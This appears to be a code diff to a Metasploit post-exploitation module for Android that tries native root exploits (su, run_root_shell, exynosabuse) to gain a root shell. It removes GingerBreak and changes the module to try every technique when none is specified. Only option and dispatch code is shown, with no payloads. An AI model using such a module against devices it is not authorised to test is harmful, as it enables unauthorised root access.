@@ -18,9 +18,7 @@ class Metasploit3 < Msf::Post
 	def initialize(info={})
 		super(update_info(info,
 			'Name'          => 'Android Escalate via Native Binary',
-			'Description'   => %q{
-					This module uses native binaries to attempt to get a root shell
-			},
+			'Description'   => %q{ This module uses native binaries to attempt to get a root shell },
 			'License'       => MSF_LICENSE,
 			'Author'        => 'timwr',
 			'Platform'      => [ 'android' ],
@@ -28,10 +26,10 @@ class Metasploit3 < Msf::Post
 		))
 
 		register_options([
-			OptInt.new('TECHNIQUE', [false, "Specify a particular technique to use (1-4), otherwise try them all", 0])
+			OptInt.new('TECHNIQUE', [false, "Specify a particular technique to use (1-2), otherwise try them all", 0])
 		], self.class)
 		
-		@techniques = [ 'su', 'run_root_shell', 'exynosabuse', 'GingerBreak' ]
+		@techniques = [ 'su', 'run_root_shell', 'exynosabuse' ]
 	end
 
 	def use_technique(tech)
@@ -79,7 +77,13 @@ class Metasploit3 < Msf::Post
 
 	def run
 		tech = datastore['TECHNIQUE'].to_i
-		use_technique(2)
+		if tech == 0
+			use_technique(2)
+			use_technique(1)
+			use_technique(0)
+		else
+			use_technique(tech)
+		end
 	end
 
 end
